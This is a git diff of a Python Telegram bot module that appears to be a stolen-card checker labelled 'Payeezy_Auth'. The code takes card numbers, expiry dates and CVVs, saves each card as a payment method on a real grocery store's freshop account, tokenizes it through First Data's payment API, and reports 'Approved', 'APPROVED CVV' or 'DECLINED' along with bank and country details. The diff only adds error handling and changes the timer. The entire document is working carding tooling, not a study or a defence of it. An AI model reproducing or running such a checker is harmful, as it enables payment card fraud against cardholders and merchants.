@@ -39,7 +39,7 @@ async def gateway(client: Client, m: Message):
 
 async def get_live(card, msg):
 
-    initial_time = time.perf_counter()
+    initial_time = time.time()
     BIN = card[0:6]
     data_bin = r.get(BIN_API+BIN).json()
 
@@ -130,135 +130,134 @@ async def get_live(card, msg):
         }
 
         
+    try: 
+        response = session.get('https://api.freshop.com/2/user_addresses', params=params, headers=headers).text
+        userid = makeGate.getStr(response, '"user_id":"', '"')  
 
-    response = session.get('https://api.freshop.com/2/user_addresses', params=params, headers=headers).text
-    userid = makeGate.getStr(response, '"user_id":"', '"')            
-            
-            
-    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Fourth request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Fourth request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
         
-    headers = {
-        'authority': 'api.freshop.com',
-        'origin': 'https://www.shakersmarketplace.com',
-        'referer': 'https://www.shakersmarketplace.com/my-account',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
-    }
-
-    data = f'app_key=shakers&referrer=https%3A%2F%2Fwww.shakersmarketplace.com%2Fmy-account%23!%2Fpayment-methods%3Fid%3D0%26identifier%3Dpayeezy_v2&store_id=3667&token={token}&utc={current_timestamp}'
-
-    response = session.post(
-                f'https://api.freshop.com/2/users/{userid}/saved_payment/payeezy_v2/initiate',
-                headers=headers,
-                data=data,
-    )
-                
-    jsondata = response.json()
-    resp = response.text
-    bearer = makeGate.getStr(resp, '"client_token":"', '"')
-                
-
-    public_key_bytes = base64.b64decode(jsondata["publicKeyBase64"])
-
-
-    public_key = rsa.PublicKey.load_pkcs1_openssl_pem(public_key_bytes)
-
-    data_to_encrypt = {
-            'name': 'Juan Smith',
-            'card': ccnum,
-            'cvv': cvv,
-            'exp': f'{mes}/{ano}'
-    }
-            
-    json_string = json.dumps(data_to_encrypt)
-
-    encrypted_data = rsa.encrypt(json_string.encode('utf-8'), public_key)
-
-    encrypted_data_base64 = base64.b64encode(encrypted_data).decode('utf-8')
-                
-            
-    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Fifth request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        
-    headers = {
-        'Accept': '*/*',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Access-Control-Request-Headers': 'client-token,content-type',
-        'Access-Control-Request-Method': 'POST',
-        'Connection': 'keep-alive',
-        'Origin': 'https://docs.paymentjs.firstdata.com',
-        'Referer': 'https://docs.paymentjs.firstdata.com/',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
-        }
-            
-
-    response = session.options('https://prod.api.firstdata.com/paymentjs/v2/client/tokenize', headers=headers)
-        
-    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Sixth request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        
-    headers = {
-            'Accept': '*/*',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Client-Token': f'Bearer {bearer}',
-            'Origin': 'https://docs.paymentjs.firstdata.com',
-            'Referer': 'https://docs.paymentjs.firstdata.com/',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
-    }
-
-    json_data = {
-            'encryptedData': encrypted_data_base64,
-        }
-
-
-
-    response = session.post('https://prod.api.firstdata.com/paymentjs/v2/client/tokenize', headers=headers, json=json_data).text
-                
-        
-    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Seventh request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        
-    headers = {
+        headers = {
             'authority': 'api.freshop.com',
-            'accept': 'application/json, text/javascript, */*; q=0.01',
-            'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
             'origin': 'https://www.shakersmarketplace.com',
             'referer': 'https://www.shakersmarketplace.com/my-account',
-            'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'cross-site',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
         }
 
-    data = f'app_key=shakers&browser_color_depth=24&browser_java_enabled=False&browser_java_script_enabled=True&browser_language=en-US&browser_screen_height=768&browser_screen_width=1366&browser_time_zone=300&card_token={bearer}&referrer=https%3A%2F%2Fwww.shakersmarketplace.com%2Fmy-account%23!%2Fpayment-methods%3Fid%3D0%26identifier%3Dpayeezy_v2&save_payment=true&store_id=3667&token={token}&utc={current_timestamp}'
+        data = f'app_key=shakers&referrer=https%3A%2F%2Fwww.shakersmarketplace.com%2Fmy-account%23!%2Fpayment-methods%3Fid%3D0%26identifier%3Dpayeezy_v2&store_id=3667&token={token}&utc={current_timestamp}'
+
+        response = session.post(
+                    f'https://api.freshop.com/2/users/{userid}/saved_payment/payeezy_v2/initiate',
+                    headers=headers,
+                    data=data,
+        )
+                    
+        jsondata = response.json()
+        resp = response.text
+        bearer = makeGate.getStr(resp, '"client_token":"', '"')
+                    
+
+        public_key_bytes = base64.b64decode(jsondata["publicKeyBase64"])
 
 
+        public_key = rsa.PublicKey.load_pkcs1_openssl_pem(public_key_bytes)
 
-    response = session.post(
-        f'https://api.freshop.com/2/users/{userid}/payment_methods/payeezy_v2',
-        headers=headers,
-        data=data,
-                )
-        
-    time.sleep(2)
+        data_to_encrypt = {
+                'name': 'Juan Smith',
+                'card': ccnum,
+                'cvv': cvv,
+                'exp': f'{mes}/{ano}'
+        }
                 
-        
-    if "{}" in response.text:
-        msgx = "Approved Auth!✅"
-        respuesta = "Subscription completed"
+        json_string = json.dumps(data_to_encrypt)
+
+        encrypted_data = rsa.encrypt(json_string.encode('utf-8'), public_key)
+
+        encrypted_data_base64 = base64.b64encode(encrypted_data).decode('utf-8')
+                    
+                
+        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Fifth request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
             
-    elif int(response.text.find('Insufficient Funds')) > 0 :
-        msgx = "APPROVED CVV✅"
-        respuesta = "Insufficient Funds"
-                            
-    else:
-        respuesta = makeGate.getStr(response.text, '"error_message":"', '"')
-        msgx = "DECLINED! ❌"
+        headers = {
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Access-Control-Request-Headers': 'client-token,content-type',
+            'Access-Control-Request-Method': 'POST',
+            'Connection': 'keep-alive',
+            'Origin': 'https://docs.paymentjs.firstdata.com',
+            'Referer': 'https://docs.paymentjs.firstdata.com/',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
+            }
+                
 
-    final_time = time.perf_counter() - initial_time
-    data = r.get(BIN_API+BIN).json()
+        response = session.options('https://prod.api.firstdata.com/paymentjs/v2/client/tokenize', headers=headers)
+            
+        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Sixth request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+            
+        headers = {
+                'Accept': '*/*',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Client-Token': f'Bearer {bearer}',
+                'Origin': 'https://docs.paymentjs.firstdata.com',
+                'Referer': 'https://docs.paymentjs.firstdata.com/',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
+        }
 
-    card_response = f"""<b>#Payeezy_Auth ($yz) 🌩️</b>
+        json_data = {
+                'encryptedData': encrypted_data_base64,
+            }
+
+
+
+        response = session.post('https://prod.api.firstdata.com/paymentjs/v2/client/tokenize', headers=headers, json=json_data).text
+                    
+            
+        # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Seventh request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+            
+        headers = {
+                'authority': 'api.freshop.com',
+                'accept': 'application/json, text/javascript, */*; q=0.01',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'origin': 'https://www.shakersmarketplace.com',
+                'referer': 'https://www.shakersmarketplace.com/my-account',
+                'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'cross-site',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
+            }
+
+        data = f'app_key=shakers&browser_color_depth=24&browser_java_enabled=False&browser_java_script_enabled=True&browser_language=en-US&browser_screen_height=768&browser_screen_width=1366&browser_time_zone=300&card_token={bearer}&referrer=https%3A%2F%2Fwww.shakersmarketplace.com%2Fmy-account%23!%2Fpayment-methods%3Fid%3D0%26identifier%3Dpayeezy_v2&save_payment=true&store_id=3667&token={token}&utc={current_timestamp}'
+
+
+
+        response = session.post(
+            f'https://api.freshop.com/2/users/{userid}/payment_methods/payeezy_v2',
+            headers=headers,
+            data=data,
+                    )
+            
+        time.sleep(2)
+                    
+            
+        if "{}" in response.text:
+            msgx = "Approved Auth!✅"
+            respuesta = "Subscription completed"
+                
+        elif int(response.text.find('Insufficient Funds')) > 0 :
+            msgx = "APPROVED CVV✅"
+            respuesta = "Insufficient Funds"
+                                
+        else:
+            respuesta = makeGate.getStr(response.text, '"error_message":"', '"')
+            msgx = "DECLINED! ❌"
+
+        final_time = time.time() - initial_time
+        data = r.get(BIN_API+BIN).json()
+
+        card_response = f"""<b>#Payeezy_Auth ($yz) 🌩️</b>
 ━━━━━━━━━━━
 <a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccnum}:{mes}:{ano}:{cvv}</code>]
 <a href="https://t.me/ByDog3r">↯</a> <b>Status: {msgx}<b> 
@@ -271,4 +270,22 @@ async def get_live(card, msg):
 <a href="https://t.me/ByDog3r">⊁</a> <code>{data['bank']}</code>
 <a href="https://t.me/ByDog3r">⊁</a> <code>{data['country_name']} {data['country_flag']}</code>
 <a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}"""
-    await msg.edit_text(card_response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+        await msg.edit_text(card_response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+
+    except:
+        final_time = time.time() - initial_time
+        data = r.get(BIN_API+BIN).json()
+        msgg = f"""<b>#Payeezy_Auth ($yz) 🌩️</b>
+━━━━━━━━━━━
+<a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccnum}:{mes}:{ano}:{cvv}</code>]
+<a href="https://t.me/ByDog3r">↯</a> <b>Status: DECLINED! ❌<b> 
+<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> There is an error with the website, try again.
+<a href="https://t.me/ByDog3r">↯</a> <b>Gateway: {subtype}</b>
+━━━━━━━━━━━
+<code>| Bank Information</code>
+━━━━━━━━━━━
+<a href="https://t.me/ByDog3r">⊁</a> <code>{data['brand']}</code> - <code>{data['type']}</code> - <code>{data['level']}</code>
+<a href="https://t.me/ByDog3r">⊁</a> <code>{data['bank']}</code>
+<a href="https://t.me/ByDog3r">⊁</a> <code>{data['country_name']} {data['country_flag']}</code>
+<a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}"""
+        await msg.edit_text(msgg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
